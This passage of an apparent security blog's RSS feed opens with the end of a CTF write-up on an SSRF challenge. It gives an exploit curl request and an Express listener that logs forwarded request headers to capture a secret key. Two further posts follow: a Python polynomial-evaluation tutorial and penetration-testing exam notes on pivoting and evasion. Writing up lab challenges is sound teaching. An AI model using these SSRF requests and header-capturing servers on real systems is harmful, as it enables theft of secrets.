  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;x-real-ip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.30.18.174&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;x-forwarded-for&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.30.18.174&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;x-forwarded-proto&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;user-agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;curl/8.12.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*/*&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Key Information: You can see the host field, which identifies the virtual host used (alley.firstalleyontheleft.com), along with additional headers that might help identify how the server is configured or its internal structure.&lt;/p&gt;

&lt;p&gt;Step 3: Exploiting the SSRF Vulnerability&lt;/p&gt;

&lt;p&gt;With the knowledge gained in Step 1 and Step 2, the attacker can now craft an exploit that forces the server to make a request to a location controlled by the attacker.&lt;/p&gt;

&lt;p&gt;The goal is to make the server fetch a URL that exfiltrates sensitive headers. The quote parameter in the vulnerable /guardian endpoint can be manipulated to point to the attacker’s server (which will capture the request headers).&lt;/p&gt;

&lt;p&gt;Exploit Request:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://$IP:$PORT/guardian?quote=http%3A%2F%2Flocalhost%3A1337%2Fthink -H &apos;Host: guardian.firstalleyontheleft.com&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Explanation: quote=http%3A%2F%2Flocalhost%3A1337%2Fthink is the URL-encoded path that will make the server send a request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost:1337/think&lt;/code&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host: guardian.firstalleyontheleft.com&lt;/code&gt; specifies the target virtual host for the request.&lt;/p&gt;

&lt;p&gt;When the vulnerable server processes this request, it will make a server-side request to &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost:1337/think&lt;/code&gt;&lt;/strong&gt;, and any sensitive headers (like Key, which might contain the flag) will be forwarded to the attacker’s server.&lt;/p&gt;

&lt;h1 id=&quot;step-4-capture-the-flag&quot;&gt;Step 4: Capture the Flag&lt;/h1&gt;

&lt;p&gt;The attacker must set up a server to listen for incoming HTTP requests and capture sensitive headers like the Key header, which may contain the flag.&lt;/p&gt;

&lt;p&gt;Example attacker server using Node.js (Express):&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Received headers:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Capture sensitive headers&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Request received!&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Server is listening on port 1337&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this article, we’ve walked through the process of exploiting an SSRF vulnerability, leveraging HTTP/1.0 downgrades to manipulate server behavior, and capturing sensitive data through crafted HTTP requests. By following this methodology, attackers can exfiltrate secrets from vulnerable applications, while defenders can use the outlined mitigations to secure their systems from such attacks. Always be aware of SSRF risks and take proactive steps to mitigate them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/ach/dusty_alley.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 14 Apr 2025 00:00:00 +0200</pubDate>
        <link>http://localhost:4000//Web_Dusty_alleys</link>
        <link href="http://localhost:4000/Web_Dusty_alleys"/>
        <guid isPermaLink="true">http://localhost:4000/Web_Dusty_alleys</guid>
      </item>
    
      <item>
        <title>Misc_Evalutative</title>
        <description>&lt;p&gt;Evaluating a Polynomial in Python&lt;/p&gt;

&lt;p&gt;In mathematics and computer science, evaluating a polynomial at a given point is a common task. This article explains a simple Python script that accomplishes this. The polynomial is expressed in the following form:
P(x)=a0+a1x+a2x2+⋯+an−1xn−1
P(x)=a0​+a1​x+a2​x2+⋯+an−1​xn−1&lt;/p&gt;

&lt;p&gt;where a0,a1,…,an−1a0​,a1​,…,an−1​ are the coefficients, and xx is the value at which the polynomial is evaluated.
The Python Code&lt;/p&gt;

&lt;p&gt;Below is the Python code that reads the coefficients and the evaluation point, then computes and prints the polynomial’s value:&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Read coefficients (e.g., &quot;1 -2 3&quot; for polynomial 1 - 2x + 3x^2)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coefficients&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Read the evaluation point, x
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Initialize result
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Evaluate the polynomial: a0 + a1*x + a2*x^2 + ... + a_{n-1}*x^{n-1}
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;power&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;coef&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coefficients&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;coef&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;power&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Print the evaluated result
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;detailed-explanation&quot;&gt;Detailed Explanation&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Reading the Input&lt;/p&gt;

    &lt;p&gt;Coefficients:
 The line:&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;coefficients = list(map(int, input().split()))&lt;/p&gt;

&lt;p&gt;reads a single line of space-separated integers. For instance, if you input:&lt;/p&gt;

&lt;p&gt;1 -2 3 it produces a list of integers: [1, -2, 3]&lt;/p&gt;

&lt;p&gt;This list represents the coefficients a0a0​, a1a1​, and a2a2​ of the polynomial:
P(x)=1−2x+3x2
P(x)=1−2x+3x2&lt;/p&gt;

&lt;p&gt;Evaluation Point:
The next line:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x = int(input())&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;reads another input which is the value of xx where the polynomial will be evaluated. For example, if you input: 2 then x=2x=2.&lt;/p&gt;

&lt;p&gt;by the way input() can be done also like this:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;random_values&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random_values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random_values&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;polynomial-evaluation&quot;&gt;Polynomial Evaluation&lt;/h4&gt;

&lt;p&gt;The polynomial is computed using a loop:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Initialization:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;result = 0&lt;/p&gt;

&lt;p&gt;initializes a variable to accumulate the sum of each term.&lt;/p&gt;

&lt;p&gt;Looping Over Coefficients:
The loop:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for power, coef in enumerate(coefficients):
    result += coef * (x ** power)

works as follows:

    enumerate(coefficients) iterates over the list, providing both the index (power) and the coefficient (coef).

    For each coefficient, the term coef×xpowercoef×xpower is computed.

    This term is added to result.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Mathematical Breakdown&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The code implements the mathematical formula for polynomial evaluation:
P(x)=∑i=0n−1aixi
P(x)=i=0∑n−1​ai​xi&lt;/p&gt;

&lt;p&gt;For each term:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aiai​ is the coefficient at position ii,

xixi is xx raised to the power ii.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The loop iterates over each coefficient and calculates the term aixiai​xi before adding it to the cumulative result.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Example Walkthrough&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let’s consider an example:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Input Coefficients:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;1 -2 3&lt;/p&gt;

&lt;p&gt;represents the polynomial:
P(x)=1−2x+3x2
P(x)=1−2x+3x2&lt;/p&gt;

&lt;p&gt;Input Evaluation Point:&lt;/p&gt;

&lt;p&gt;2&lt;/p&gt;

&lt;p&gt;Calculation:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;For i=0i=0: 1×20=11×20=1

For i=1i=1: −2×21=−4−2×21=−4

For i=2i=2: 3×22=123×22=12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Summing these up:
P(2)=1−4+12=9
P(2)=1−4+12=9&lt;/p&gt;

&lt;p&gt;Output: The script prints:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Conclusion&lt;/p&gt;

&lt;p&gt;This Python script is a straightforward implementation of polynomial evaluation using basic programming constructs. By reading a list of coefficients and an evaluation point from the user, it computes the polynomial value using a loop and the power operator. This approach not only demonstrates fundamental programming skills but also illustrates how mathematical concepts are implemented in code.&lt;/p&gt;

&lt;p&gt;Whether you’re working on homework, developing mathematical software, or just learning Python, this example provides a clear method to combine programming with mathematics.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/ach/misc_evaluative.png&quot; alt=&quot;ach&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 12 Apr 2025 00:00:00 +0200</pubDate>
        <link>http://localhost:4000//Misc_Evalutative</link>
        <link href="http://localhost:4000/Misc_Evalutative"/>
        <guid isPermaLink="true">http://localhost:4000/Misc_Evalutative</guid>
      </item>
    
      <item>
        <title>Blogspot</title>
        <description>&lt;p&gt;&lt;img src=&quot;https://www.brunorochamoura.com/posts/cpts-tips/cover.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Stage   Description&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Pre-Engagement   The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions.&lt;/li&gt;
  &lt;li&gt;Information Gathering  Once the pre-engagement activities are complete, we investigate the company’s existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions.&lt;/li&gt;
  &lt;li&gt;Vulnerability Assessment   With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions.&lt;/li&gt;
  &lt;li&gt;Exploitation   Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities.&lt;/li&gt;
  &lt;li&gt;Post-Exploitation  Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations).&lt;/li&gt;
  &lt;li&gt;Lateral Movement   If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered.&lt;/li&gt;
  &lt;li&gt;Proof-of-Concept   We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities.&lt;/li&gt;
  &lt;li&gt;Post-Engagement  Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;cpts-exam&quot;&gt;CPTS-exam&lt;/h2&gt;

&lt;p&gt;We will interact with more than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;150 targets&lt;/code&gt; during the Penetration Tester Job Role Path and perform nine simulated mini penetration tests, giving us plenty of opportunities to work on and practice this topic. Furthermore, operating system-specific modules should be considered from the pillaging point of view because much of what is shown in those modules can be used for information retrieval or privilege escalation on the target systems.&lt;/p&gt;

&lt;p&gt;So pillaging Another essential step is Pillaging. After hitting the Post-Exploitation stage, pillaging is performed to collect sensitive information locally on the already exploited host, such as employee names, customer data, and much more. However, this information gathering only occurs after exploiting the target host and gaining access to it.&lt;/p&gt;

&lt;h2 id=&quot;mindset&quot;&gt;mindset&lt;/h2&gt;

&lt;p&gt;Other than the fact that this port is open, Nmap did not show us anything else. We must now ask ourselves what conclusions can be drawn from this result. Therefore, it does not matter which question we start with to make our conclusions. However, it is essential to ask &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;precise questions&lt;/code&gt; and remember what we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;know&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do not know&lt;/code&gt;. At this point, we must first ask ourselves what we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;see&lt;/code&gt; and what we actually &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;have&lt;/code&gt;, because what we see is not the same as what we have:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2121&lt;/code&gt;. - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; already means that this service is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;connection-oriented&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Is this a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;standard&lt;/code&gt; port? - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No&lt;/code&gt;, because these are between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0-1023&lt;/code&gt;, aka well-known or &lt;a href=&quot;https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml&quot;&gt;system ports&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Are there any numbers in this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port number&lt;/code&gt; that look &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;familiar&lt;/code&gt;? - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Yes&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;). From our experience, we will get to know many standard ports and their services, which administrators often try to disguise, but often use “easy to remember” alternatives.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Based on our guess, we can try to connect to the service using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; or an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; client and try to establish a connection to confirm or disprove our guess.&lt;/p&gt;

&lt;p&gt;While connecting to the service, we noticed that the connection took longer than usual (about 15 seconds). There are some services whose connection speed, or response time, can be configured. Now that we know that an FTP server is running on this port, we can deduce the origin of our “failed” scan. We could confirm this again by specifying the minimum &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;probe round trip time&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--min-rtt-timeout&lt;/code&gt;) in Nmap to 15 or 20 seconds and rerunning the scan.&lt;/p&gt;

&lt;h2 id=&quot;pivoting&quot;&gt;Pivoting&lt;/h2&gt;

&lt;p&gt;In most cases, the system we use will not have the tools to enumerate the internal network efficiently. Some techniques allow us to use the exploited host as a proxy and perform all the scans from our attack machine or VM. In doing so, the exploited system represents and routes all our network requests sent from our attack machine to the internal network and its network components.&lt;/p&gt;

&lt;p&gt;In this way, we make sure that non-routable networks (and therefore publicly unreachable) can still be reached. This allows us to scan them for vulnerabilities and penetrate deeper into the network. This process is also known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pivoting&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tunneling&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;An elementary example could be that we have a printer at home that is not accessible from the Internet, but we can send print jobs from our home network. If one of the hosts on our home network has been compromised, it could be leveraged to send these jobs to the printer. Though this is a simple (and unlikely) example, it illustrates the goal of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pivoting&lt;/code&gt;, which is to access inaccessible systems via an intermediary system.&lt;/p&gt;

&lt;h2 id=&quot;evasive-testing&quot;&gt;Evasive Testing&lt;/h2&gt;

&lt;p&gt;Also, at this stage, we should consider whether evasive testing is part of the assessment scope. There are different procedures for each tactic, which support us in disguising these requests to not trigger an internal alarm among the administrators and the blue team.&lt;/p&gt;

